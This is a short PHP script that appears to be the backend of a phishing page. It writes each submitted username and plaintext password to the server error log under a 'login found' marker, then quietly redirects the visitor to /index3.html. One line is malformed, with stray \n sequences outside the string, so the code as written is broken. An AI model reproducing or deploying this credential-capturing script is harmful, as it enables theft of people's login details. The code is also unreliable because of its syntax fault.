<?php
error_log("login found");
error_log("----------------------------------");
error_log("\n\n\n Username: " . $_POST['username'] . " \n Pass: " . $_POST['password']\n\n\n );
error_log("----------------------------------");
header('Location:/index3.html');
exit();
